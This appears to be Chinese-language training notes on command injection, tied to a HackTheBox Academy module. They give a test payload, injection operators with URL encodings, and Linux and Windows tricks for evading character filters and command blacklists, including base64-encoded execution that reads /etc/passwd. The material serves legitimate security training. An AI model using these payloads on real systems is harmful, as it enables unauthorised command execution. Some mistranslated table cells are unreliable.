# Command Injection

{% stepper %}
{% step %}
<mark style="color:green;">**發現點**</mark>

`Host Checker`實用程序
{% endstep %}

{% step %}
<mark style="color:green;">**測試Payload**</mark>

```bash
ping -c 1 127.0.0.1; whoami
```
{% endstep %}

{% step %}
<mark style="color:green;">**bypass技巧**</mark>

<table data-header-hidden><thead><tr><th width="156.265625"></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>注入操作符</strong></td><td><strong>注塑件</strong></td><td><strong>URL 編碼字符</strong></td><td><strong>執行的命令</strong></td></tr><tr><td>分號</td><td><code>;</code></td><td><code>%3b</code></td><td>兩個都</td></tr><tr><td>新線</td><td></td><td><code>%0a</code></td><td>兩個都</td></tr><tr><td>背景</td><td><code>&#x26;</code>  <code>&#x26;</code></td><td><code>%26</code></td><td>兩者（第二個輸出通常首先顯示）</td></tr><tr><td>管道</td><td><code>|</code></td><td><code>%7c</code></td><td>兩者（僅顯示第二個輸出）</td></tr><tr><td>和</td><td><code>&#x26;&#x26;</code><br><code>&#x26;&#x26;</code></td><td><code>%26%26</code></td><td>兩者（僅當第一個成功時）</td></tr><tr><td>或者</td><td><code>||</code></td><td><code>%7c%7c</code></td><td>第二（只當第一失敗時）</td></tr><tr><td>子殼</td><td><code>``</code></td><td><code>%60%60</code></td><td>兩者（僅限 Linux）  兩名用戶（僅限 Linux）</td></tr><tr><td>子殼</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>兩者（僅限 Linux）  兩名用戶（僅限 Linux）</td></tr></tbody></table>
{% endstep %}

{% step %}
<mark style="color:green;">濫用</mark>

## Linux

### Filtered Character Bypass

| Code                    | Description                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------- |
| `printenv`              | Can be used to view all environment variables                                      |
| **Spaces**              |                                                                                    |
| `%09`                   | Using tabs instead of spaces                                                       |
| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}`              | Commas will be replaced with spaces                                                |
| **Other Characters**    |                                                                                    |
| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |

***

### Blacklisted Command Bypass

| Code                                                         | Description                         |
| ------------------------------------------------------------ | ----------------------------------- |
| **Character Insertion**                                      |                                     |
| `'` or `"`                                                   | Total must be even                  |
| `$@` or `\`                                                  | Linux only                          |
| **Case Manipulation**                                        |                                     |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |
| **Reversed Commands**                                        |                                     |
| `echo 'whoami' \| rev`                                       | Reverse a string                    |
| `$(rev<<<'imaohw')`                                          | Execute reversed command            |
| **Encoded Commands**                                         |                                     |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |

***

## Windows

### Filtered Character Bypass

| Code                    | Description                                                  |
| ----------------------- | ------------------------------------------------------------ |
| `Get-ChildItem Env:`    | Can be used to view all environment variables - (PowerShell) |
| **Spaces**              |                                                              |
| `%09`                   | Using tabs instead of spaces                                 |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD)                        |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell)                 |
| **Other Characters**    |                                                              |
| `%HOMEPATH:~0,-17%`     | Will be replaced with `\` - (CMD)                            |
| `$env:HOMEPATH[0]`      | Will be replaced with `\` - (PowerShell)                     |

***

### Blacklisted Command Bypass

| Code                                                                                                         | Description                              |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
| **Character Insertion**                                                                                      |                                          |
| `'` or `"`                                                                                                   | Total must be even                       |
| `^`                                                                                                          | Windows only (CMD)                       |
| **Case Manipulation**                                                                                        |                                          |
| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
| **Reversed Commands**                                                                                        |                                          |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
| **Encoded Commands**                                                                                         |                                          |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
{% endstep %}
{% endstepper %}

## <mark style="color:red;">4.Skills Assessment</mark>

[<mark style="color:red;">https://academy.hackthebox.com/module/109/section/1042</mark>](https://academy.hackthebox.com/module/109/section/1042)
